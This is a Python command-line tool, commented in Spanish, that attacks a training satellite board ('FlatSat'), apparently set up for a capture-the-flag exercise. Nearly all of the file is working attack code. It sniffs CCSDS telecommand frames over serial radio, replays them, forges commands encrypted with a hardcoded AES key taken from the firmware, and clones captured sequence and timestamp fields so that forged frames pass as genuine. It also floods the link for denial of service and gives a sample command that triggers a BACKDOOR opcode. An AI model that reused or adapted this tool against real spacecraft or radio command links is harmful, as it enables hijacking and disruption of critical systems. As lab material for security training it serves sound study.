#!/usr/bin/env python3
"""
flatsat_spoof.py — FlatSat Spoofing Attack Tool
================================================
Captura tramas legítimas del satélite, las analiza y transmite tramas
forjadas que se hacen pasar por el satélite o la ground station.

Modos de ataque:
  sniff      Capturar tramas reales para análisis
  replay     Repetir trama capturada tal cual (replay attack)
  forge      Forjar trama CCSDS personalizada
  clone      Clonar el seq/MET de la última trama capturada y cambiar payload
  flood      Enviar múltiples tramas forjadas rapidamente

Uso:
  python flatsat_spoof.py sniff
  python flatsat_spoof.py replay --hex 1820002000010010AABB
  python flatsat_spoof.py forge --apid 0x020 --op 0x10
  python flatsat_spoof.py forge --apid 0x020 --op 0x42 --payload 0000
  python flatsat_spoof.py clone --hex <trama_capturada> --op 0x02
  python flatsat_spoof.py flood --apid 0x020 --op 0x10 --count 20

Requiere: pyserial
"""

import argparse
import re
import struct
import sys
import time
from datetime import datetime

# ─── Constantes CCSDS (sincronizadas con firmware) ───────────────────────────

CCSDS_VERSION     = 0
CCSDS_TYPE_TM     = 0
CCSDS_TYPE_TC     = 1
CCSDS_SEQ_STANDALONE = 3
HDR_SIZE          = 6
SEC_HDR_SIZE      = 4
CRC_SIZE          = 2
SPACECRAFT_ID     = 0x02

# APIDs del firmware (ccsds_apid.h)
APIDS = {
    "TM_HEARTBEAT": 0x001,
    "TM_BME280":    0x010,
    "TM_LIS2DH":    0x011,
    "TM_POWER":     0x012,
    "TM_GPS":       0x013,
    "TM_ALL":       0x01F,
    "TC_COMMAND":   0x020,
    "TC_SET_FREQ":  0x021,
    "TC_SET_POWER": 0x022,
    "TC_FIRMWARE":  0x026,
    "TC_SET_DIFF":  0x027,
    "DIAG_LOG":     0x030,
    "DIAG_MEM":     0x031,
    "CTF_FLAG":     0x040,
    "SECRET_DEBUG": 0x539,
    "IDLE":         0x7FF,
}

# Opcodes de telecomando
OPCODES = {
    "NOP":             0x00,
    "SET_SAFE":        0x01,
    "SET_NOMINAL":     0x02,
    "SET_DEBUG":       0x03,
    "PING":            0x10,
    "READ_SENSOR":     0x20,
    "SET_TM_RATE":     0x30,
    "OVERRIDE_SENSOR": 0x40,
    "READ_FLAG":       0x42,
    "SET_CALLSIGN":    0x50,
    "STORE_CMD":       0x60,
    "TABLE_WRITE":     0x70,
    "NEOPIXEL":        0xA0,
    "CRYPTO_ORACLE":   0xC0,
    "PRIVILEGED":      0xD0,
    "EXEC":            0xEE,
    "BACKDOOR":        0xFF,
}

# Clave AES hardcodeada en el firmware (vulnerabilidad V04)
AES_KEY = b"PWNSAT_K3Y_2026!"
# Clave XOR (SDLS nivel 1)
XOR_KEY = b"PWNSAT"

# USB
USB_VID  = 0x1209
USB_PID  = 0xBABC
BAUDRATE = 115200

# Colores ANSI
_COLOR = sys.stdout.isatty()
def _c(code, t): return f"\033[{code}m{t}\033[0m" if _COLOR else t
def green(t):  return _c("92", t)
def cyan(t):   return _c("96", t)
def yellow(t): return _c("93", t)
def red(t):    return _c("91", t)
def dim(t):    return _c("2",  t)
def bold(t):   return _c("1",  t)
def magenta(t):return _c("95", t)


# ─── CCSDS Frame Builder ──────────────────────────────────────────────────────

def crc16(data: bytes) -> int:
    crc = 0xFFFF
    for b in data:
        crc ^= b << 8
        for _ in range(8):
            crc = ((crc << 1) ^ 0x1021) if (crc & 0x8000) else (crc << 1)
            crc &= 0xFFFF
    return crc


_seq = 0

def build_tc(apid: int, payload: bytes, seq: int | None = None, met: int | None = None) -> bytes:
    """Construye una trama CCSDS TC completa con CRC-16-CCITT."""
    global _seq
    if met is None:
        met = int(time.time()) & 0xFFFFFFFF
    if seq is None:
        _seq = (_seq + 1) & 0x3FFF
        seq = _seq

    pkt_id  = (CCSDS_VERSION << 13) | (CCSDS_TYPE_TC << 12) | (1 << 11) | (apid & 0x7FF)
    seq_ctl = (CCSDS_SEQ_STANDALONE << 14) | (seq & 0x3FFF)
    sec_hdr = struct.pack(">I", met)
    data_len = len(sec_hdr) + len(payload) + CRC_SIZE - 1
    hdr = struct.pack(">HHH", pkt_id, seq_ctl, data_len)

    body = hdr + sec_hdr + payload
    return body + struct.pack(">H", crc16(body))


def parse_tc(raw: bytes) -> dict | None:
    """Parsea una trama CCSDS y devuelve sus campos."""
    if len(raw) < HDR_SIZE + SEC_HDR_SIZE + CRC_SIZE:
        return None
    pkt_id, seq_ctl, data_len = struct.unpack(">HHH", raw[:6])
    version  = (pkt_id >> 13) & 0x7
    pkt_type = (pkt_id >> 12) & 0x1
    apid     = pkt_id & 0x7FF
    seq      = seq_ctl & 0x3FFF
    met      = struct.unpack(">I", raw[6:10])[0]
    payload  = raw[10:-2]
    frame_crc= struct.unpack(">H", raw[-2:])[0]
    calc_crc = crc16(raw[:-2])
    return {
        "type":      "TC" if pkt_type == 1 else "TM",
        "apid":      apid,
        "seq":       seq,
        "met":       met,
        "payload":   payload,
        "crc_ok":    frame_crc == calc_crc,
        "raw":       raw,
    }


# ─── Cifrado SDLS ─────────────────────────────────────────────────────────────

def xor_protect(data: bytes) -> bytes:
    """SDLS nivel 1: XOR con clave PWNSAT repetida."""
    key = XOR_KEY
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def aes_protect(data: bytes) -> bytes:
    """SDLS nivel 2/3: AES-128-ECB con clave hardcodeada."""
    try:
        from Crypto.Cipher import AES
    except ImportError:
        try:
            from Cryptodome.Cipher import AES
        except ImportError:
            print(red("[!] pycryptodome no instalado: pip install pycryptodome"))
            sys.exit(1)
    padded = data + b"\x00" * (16 - len(data) % 16) if len(data) % 16 else data
    return AES.new(AES_KEY, AES.MODE_ECB).encrypt(padded)


def protect_frame(raw: bytes, sdls: int) -> bytes:
    """Aplica protección SDLS al payload antes del CRC."""
    if sdls == 0:
        return raw
    # Extraer payload (bytes 10 a -2), cifrar, reconstruir
    hdr     = raw[:10]
    payload = raw[10:-2]
    if sdls == 1:
        protected = xor_protect(payload)
    else:
        protected = aes_protect(payload)
    body = hdr + protected
    return body + struct.pack(">H", crc16(body))


# ─── Descubrimiento de puertos ────────────────────────────────────────────────

def _is_flatsat(p) -> bool:
    try:
        if p.vid == USB_VID and p.pid == USB_PID:
            return True
    except AttributeError:
        pass
    hwid = (getattr(p, "hwid", "") or "").upper()
    if "1209" in hwid and "BABC" in hwid:
        return True
    desc = (getattr(p, "description", "") or "").upper()
    for kw in ("FLATSAT", "CATSNIFFER", "CAT-RADIO", "CAT-SHELL"):
        if kw in desc:
            return True
    return False


def _normalize(path: str) -> str:
    if sys.platform == "win32" and path:
        u = path.upper()
        if u.startswith("COM") and not u.startswith(r"\\.\COM"):
            try:
                if int(u[3:]) >= 10:
                    return rf"\\.\{u}"
            except ValueError:
                pass
    return path


def _intf_index(port) -> int | None:
    hwid = (getattr(port, "hwid", "") or "").upper()
    loc  = (getattr(port, "location", "") or "")
    m = re.search(r"LOCATION=\S+:(?:\w+)\.(\d+)", hwid, re.IGNORECASE)
    if m: return int(m.group(1))
    m = re.search(r"[&\\]MI[=_]?(\d+)", hwid, re.IGNORECASE)
    if m: return int(m.group(1))
    if loc and ":" in loc:
        try: return int(loc.split(":")[-1].split(".")[-1])
        except: pass
    return None


def discover_ports() -> dict:
    """Devuelve {'radio0': path, 'radio1': path, 'shell': path}."""
    try:
        import serial.tools.list_ports
    except ImportError:
        return {}
    all_ports = list(serial.tools.list_ports.comports())
    cat_ports = [p for p in all_ports if _is_flatsat(p)]
    if not cat_ports:
        return {}

    groups: dict[str, list] = {}
    for p in cat_ports:
        hwid = p.hwid or ""
        m = re.search(r"SER[=:]([A-Fa-f0-9]+)", hwid)
        key = m.group(1) if m else (p.serial_number or f"unk-{p.device}")
        groups.setdefault(key, []).append(p)

    for _, ports in groups.items():
        ports.sort(key=lambda p: p.device)
        result: dict[str, str] = {}
        _imap = {0: "radio0", 2: "radio1", 4: "shell"}

        for p in ports:
            desc = (p.description or "").lower()
            if "shell" in desc and "shell" not in result: result["shell"] = p.device
            elif ("radio0" in desc or "radio 0" in desc) and "radio0" not in result: result["radio0"] = p.device
            elif ("radio1" in desc or "radio 1" in desc) and "radio1" not in result: result["radio1"] = p.device

        if len(result) < 3:
            for p in ports:
                idx = _intf_index(p)
                if idx is not None:
                    role = _imap.get(idx)
                    if role and role not in result: result[role] = p.device

        if len(result) < 2:
            roles, used, ri = ["radio0", "radio1", "shell"], set(result.values()), 0
            for p in sorted(ports, key=lambda x: x.device):
                if p.device in used: continue
                while ri < len(roles) and roles[ri] in result: ri += 1
                if ri >= len(roles): break
                result[roles[ri]] = p.device; used.add(p.device); ri += 1

        if result.get("radio0") or result.get("radio1"):
            return {k: _normalize(v) for k, v in result.items()}
    return {}


# ─── I/O Serie ────────────────────────────────────────────────────────────────

def open_port(path: str, timeout: float = 1.0):
    import serial
    sp = serial.Serial(path, BAUDRATE, timeout=timeout, dsrdtr=False, rtscts=False)
    sp.dtr = True
    return sp


def parse_rx_line(line: str) -> dict | None:
    m = re.match(r"RX:\s*([A-Fa-f0-9]+)\s*\|\s*RSSI:\s*(-?\d+)\s*\|\s*SNR:\s*(-?\d+)", line)
    if m: return {"hex": m.group(1), "rssi": int(m.group(2)), "snr": int(m.group(3)), "mode": "LoRa"}
    m = re.match(r"FSK RX:\s*([A-Fa-f0-9]+)\s*\|\s*RSSI:\s*(-?\d+)\s*\|\s*Len:\s*(\d+)", line)
    if m: return {"hex": m.group(1), "rssi": int(m.group(2)), "snr": None, "mode": "FSK"}
    return None


def send_frame(sp, frame: bytes):
    """Envía una trama por radio en modo comando: 'TX <hex>\r\n'."""
    cmd = f"TX {frame.hex().upper()}\r\n"
    sp.reset_input_buffer()
    sp.write(cmd.encode("ascii"))
    sp.flush()
    time.sleep(0.5)
    resp = b""
    deadline = time.monotonic() + 2.0
    last_rx = None
    while time.monotonic() < deadline:
        w = sp.in_waiting
        if w:
            resp += sp.read(w)
            last_rx = time.monotonic()
            time.sleep(0.02)
        else:
            if last_rx and (time.monotonic() - last_rx) >= 0.15:
                break
            time.sleep(0.02)
    return resp.decode("ascii", errors="ignore").strip()


def print_frame_info(frame: bytes, label: str = ""):
    parsed = parse_tc(frame)
    if not parsed:
        print(red("  [!] Trama inválida"))
        return
    apid_name = next((k for k, v in APIDS.items() if v == parsed["apid"]), "?")
    op_name   = ""
    if parsed["payload"]:
        op = parsed["payload"][0]
        op_name = next((k for k, v in OPCODES.items() if v == op), f"0x{op:02X}")
    print(f"  {bold(label)}" if label else "", end="")
    print(f"  Tipo   : {cyan(parsed['type'])}")
    print(f"  APID   : 0x{parsed['apid']:03X} ({cyan(apid_name)})")
    print(f"  SEQ    : {parsed['seq']}")
    print(f"  MET    : {parsed['met']}")
    print(f"  Opcode : {magenta(op_name)}" if op_name else "")
    print(f"  Payload: {dim(parsed['payload'].hex())}")
    print(f"  CRC    : {'✓ OK' if parsed['crc_ok'] else red('✗ FAIL')}")
    print(f"  Hex    : {yellow(frame.hex().upper())}")
    print(f"  Bytes  : {len(frame)}")


# ─── Modos de ataque ──────────────────────────────────────────────────────────

def cmd_sniff(args):
    """Captura tramas del satélite y las analiza."""
    ports = discover_ports()
    port  = _normalize(args.port) if args.port else ports.get("radio0")
    if not port:
        print(red("[!] No se detectó ningún FlatSat. Usa --port COM<N>"))
        sys.exit(1)

    print(bold("\n  [SNIFF] Capturando tramas del satélite..."))
    print(dim(f"  Puerto : {port}"))
    print(dim(f"  Tiempo : {'ilimitado (Ctrl+C)' if args.duration <= 0 else f'{args.duration}s'}"))
    print()

    sp    = open_port(port)
    count = 0
    start = time.monotonic()
    try:
        while args.duration <= 0 or time.monotonic() - start < args.duration:
            try:
                line = sp.readline().decode("ascii", errors="ignore").strip()
            except Exception:
                break
            if not line:
                continue
            rx = parse_rx_line(line)
            if not rx:
                continue
            count += 1
            ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"  [{dim(ts)}] #{bold(str(count))} {cyan(rx['mode'])} RSSI {rx['rssi']} dBm")
            try:
                raw = bytes.fromhex(rx["hex"])
                print_frame_info(raw)
            except Exception:
                print(dim(f"  Hex raw: {rx['hex']}"))
            print()
    except KeyboardInterrupt:
        print(yellow("\n  [!] Detenido por el usuario."))
    finally:
        sp.close()
    print(dim(f"\n  Total capturadas: {count}\n"))


def cmd_replay(args):
    """Repite una trama capturada tal cual (replay attack)."""
    ports  = discover_ports()
    port   = _normalize(args.port) if args.port else ports.get("radio1")
    if not port:
        print(red("[!] No se detectó el radio de transmisión. Usa --port COM<N>"))
        sys.exit(1)

    try:
        frame = bytes.fromhex(args.hex.replace(" ", ""))
    except ValueError:
        print(red("[!] Hex inválido"))
        sys.exit(1)

    print(bold("\n  [REPLAY] Repetición de trama capturada"))
    print_frame_info(frame, label="Trama a repetir:")
    print(dim(f"\n  Puerto TX : {port}"))
    print(dim(f"  Repeticiones: {args.count}"))
    print()

    sp = open_port(port, timeout=2.0)
    for i in range(args.count):
        resp = send_frame(sp, frame)
        ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        status = green("enviado") if "TX OK" in resp or not resp else yellow(resp)
        print(f"  [{dim(ts)}] #{i+1}/{args.count} → {status}")
        if i < args.count - 1:
            time.sleep(args.delay)
    sp.close()
    print(green(f"\n  [✓] {args.count} trama(s) transmitida(s)\n"))


def cmd_forge(args):
    """Forja una trama CCSDS con APID, opcode y payload arbitrarios."""
    ports = discover_ports()
    port  = _normalize(args.port) if args.port else ports.get("radio1")

    apid    = int(args.apid, 0)
    op      = int(args.op, 0) if args.op else None
    payload = bytes.fromhex(args.payload.replace(" ", "")) if args.payload else b""
    if op is not None:
        payload = bytes([op]) + payload

    frame = build_tc(apid, payload)
    if args.sdls > 0:
        frame = protect_frame(frame, args.sdls)

    print(bold("\n  [FORGE] Trama CCSDS forjada"))
    print_frame_info(frame, label="Trama forjada:")
    if args.sdls > 0:
        print(dim(f"  SDLS nivel {args.sdls} aplicado"))
    print()

    if not args.dry_run and port:
        print(dim(f"  Transmitiendo por {port}..."))
        sp   = open_port(port, timeout=2.0)
        for i in range(args.count):
            resp = send_frame(sp, frame)
            ts   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"  [{dim(ts)}] #{i+1}/{args.count} → {green('enviado')}")
            if i < args.count - 1:
                time.sleep(args.delay)
        sp.close()
        print(green(f"\n  [✓] Transmisión completada\n"))
    elif args.dry_run:
        print(yellow("  [DRY-RUN] No se transmitió. Hex de la trama:"))
        print(f"  {yellow(frame.hex().upper())}\n")
    else:
        print(yellow("  [!] No se detectó puerto TX. Usa --port COM<N>"))
        print(f"  Hex: {yellow(frame.hex().upper())}\n")


def cmd_clone(args):
    """Clona el SEQ/MET de una trama capturada y cambia el opcode/payload."""
    ports   = discover_ports()
    port    = _normalize(args.port) if args.port else ports.get("radio1")

    try:
        original = bytes.fromhex(args.hex.replace(" ", ""))
    except ValueError:
        print(red("[!] Hex original inválido"))
        sys.exit(1)

    parsed = parse_tc(original)
    if not parsed:
        print(red("[!] No se pudo parsear la trama original"))
        sys.exit(1)

    op      = int(args.op, 0) if args.op else parsed["payload"][0] if parsed["payload"] else 0
    payload = bytes([op]) + bytes.fromhex(args.payload.replace(" ", "")) if args.payload else bytes([op])
    apid    = int(args.apid, 0) if args.apid else parsed["apid"]

    # Clonar SEQ y MET de la trama original → parece legítima
    cloned = build_tc(apid, payload, seq=parsed["seq"], met=parsed["met"])
    if args.sdls > 0:
        cloned = protect_frame(cloned, args.sdls)

    print(bold("\n  [CLONE] Trama clonada (SEQ+MET del original)"))
    print(dim("  Trama original:"))
    print_frame_info(original)
    print(dim("\n  Trama clonada:"))
    print_frame_info(cloned)
    print()

    if not args.dry_run and port:
        print(dim(f"  Transmitiendo por {port}..."))
        sp   = open_port(port, timeout=2.0)
        resp = send_frame(sp, cloned)
        sp.close()
        print(green(f"  [✓] Enviado → {resp or 'OK'}\n"))
    else:
        print(yellow(f"  Hex: {yellow(cloned.hex().upper())}\n"))


def cmd_flood(args):
    """Envía múltiples tramas rápidamente (flood / DoS)."""
    ports = discover_ports()
    port  = _normalize(args.port) if args.port else ports.get("radio1")

    apid    = int(args.apid, 0)
    op      = int(args.op, 0) if args.op else 0x10
    payload = bytes([op]) + bytes.fromhex(args.payload.replace(" ", "")) if args.payload else bytes([op])

    print(bold(f"\n  [FLOOD] Enviando {args.count} tramas"))
    print(dim(f"  APID: 0x{apid:03X}  OP: 0x{op:02X}  Delay: {args.delay}s"))
    if not port:
        print(red("[!] Sin puerto TX. Usa --port COM<N>"))
        sys.exit(1)

    print(dim(f"  Puerto TX: {port}\n"))
    sp   = open_port(port, timeout=2.0)
    sent = 0
    try:
        for i in range(args.count):
            frame = build_tc(apid, payload)
            if args.sdls > 0:
                frame = protect_frame(frame, args.sdls)
            resp  = send_frame(sp, frame)
            ts    = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"  [{dim(ts)}] #{i+1}/{args.count} SEQ={_seq} → {green('OK')}")
            sent += 1
            if args.delay > 0:
                time.sleep(args.delay)
    except KeyboardInterrupt:
        print(yellow("\n  [!] Flood detenido."))
    finally:
        sp.close()
    print(green(f"\n  [✓] {sent}/{args.count} tramas transmitidas\n"))


# ─── Punto de entrada ─────────────────────────────────────────────────────────

def main():
    print(bold("\n  ╔══════════════════════════════════════╗"))
    print(bold(  "  ║   FlatSat Spoofing Attack Tool       ║"))
    print(bold(  "  ╚══════════════════════════════════════╝"))

    try:
        import serial  # noqa
    except ImportError:
        print(red("[!] pyserial no instalado: pip install pyserial"))
        sys.exit(1)

    p = argparse.ArgumentParser(
        description="FlatSat Spoofing Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # Ver tramas en vivo y analizarlas
  python flatsat_spoof.py sniff

  # Repetir una trama capturada
  python flatsat_spoof.py replay --hex 1820002000010010AABB

  # Forjar PING (sin enviar, solo mostrar)
  python flatsat_spoof.py forge --apid 0x020 --op 0x10 --dry-run

  # Forjar y transmitir READ_FLAG
  python flatsat_spoof.py forge --apid 0x020 --op 0x42 --payload 0000

  # Forjar con cifrado SDLS nivel 1 (XOR)
  python flatsat_spoof.py forge --apid 0x020 --op 0x02 --sdls 1

  # Forjar con cifrado SDLS nivel 2/3 (AES)
  python flatsat_spoof.py forge --apid 0x020 --op 0x02 --sdls 2

  # Clonar SEQ+MET de trama real y cambiar opcode
  python flatsat_spoof.py clone --hex <hex_capturado> --op 0x02

  # Flood 50 pings
  python flatsat_spoof.py flood --apid 0x020 --op 0x10 --count 50

  # Backdoor al satélite
  python flatsat_spoof.py forge --apid 0x539 --op 0xFF --payload 50574e536b65726e656c2076657273696f6e
        """
    )

    sub = p.add_subparsers(dest="mode", required=True)

    # ── sniff ──
    s = sub.add_parser("sniff", help="Capturar y analizar tramas del satélite")
    s.add_argument("--port",     default=None, help="Puerto COM del radio RX (auto-detecta si no se indica)")
    s.add_argument("-t", "--duration", type=float, default=30.0, help="Segundos (0=Ctrl+C)")

    # ── replay ──
    r = sub.add_parser("replay", help="Repetir trama capturada (replay attack)")
    r.add_argument("--hex",      required=True, help="Trama en hexadecimal")
    r.add_argument("--port",     default=None)
    r.add_argument("--count",    type=int, default=1)
    r.add_argument("--delay",    type=float, default=1.0)

    # ── forge ──
    f = sub.add_parser("forge", help="Forjar trama CCSDS arbitraria")
    f.add_argument("--apid",    required=True, help="APID en hex, ej. 0x020")
    f.add_argument("--op",      default=None,  help="Opcode en hex, ej. 0x10")
    f.add_argument("--payload", default="",    help="Payload adicional en hex")
    f.add_argument("--sdls",    type=int, default=0, choices=[0,1,2,3], help="Nivel SDLS (0=sin cifrado)")
    f.add_argument("--port",    default=None)
    f.add_argument("--count",   type=int, default=1)
    f.add_argument("--delay",   type=float, default=1.0)
    f.add_argument("--dry-run", action="store_true", dest="dry_run", help="Solo mostrar, no transmitir")

    # ── clone ──
    c = sub.add_parser("clone", help="Clonar SEQ+MET de trama real y cambiar payload")
    c.add_argument("--hex",     required=True, help="Trama original capturada en hex")
    c.add_argument("--op",      default=None,  help="Nuevo opcode en hex")
    c.add_argument("--apid",    default=None,  help="Nuevo APID en hex (opcional, usa el original)")
    c.add_argument("--payload", default="",    help="Payload adicional en hex")
    c.add_argument("--sdls",    type=int, default=0, choices=[0,1,2,3])
    c.add_argument("--port",    default=None)
    c.add_argument("--dry-run", action="store_true", dest="dry_run")

    # ── flood ──
    fl = sub.add_parser("flood", help="Enviar múltiples tramas rápidamente")
    fl.add_argument("--apid",   required=True)
    fl.add_argument("--op",     default="0x10")
    fl.add_argument("--payload",default="")
    fl.add_argument("--count",  type=int, default=10)
    fl.add_argument("--delay",  type=float, default=0.2)
    fl.add_argument("--sdls",   type=int, default=0, choices=[0,1,2,3])
    fl.add_argument("--port",   default=None)

    args = p.parse_args()

    dispatch = {
        "sniff":  cmd_sniff,
        "replay": cmd_replay,
        "forge":  cmd_forge,
        "clone":  cmd_clone,
        "flood":  cmd_flood,
    }
    dispatch[args.mode](args)


if __name__ == "__main__":
    main()
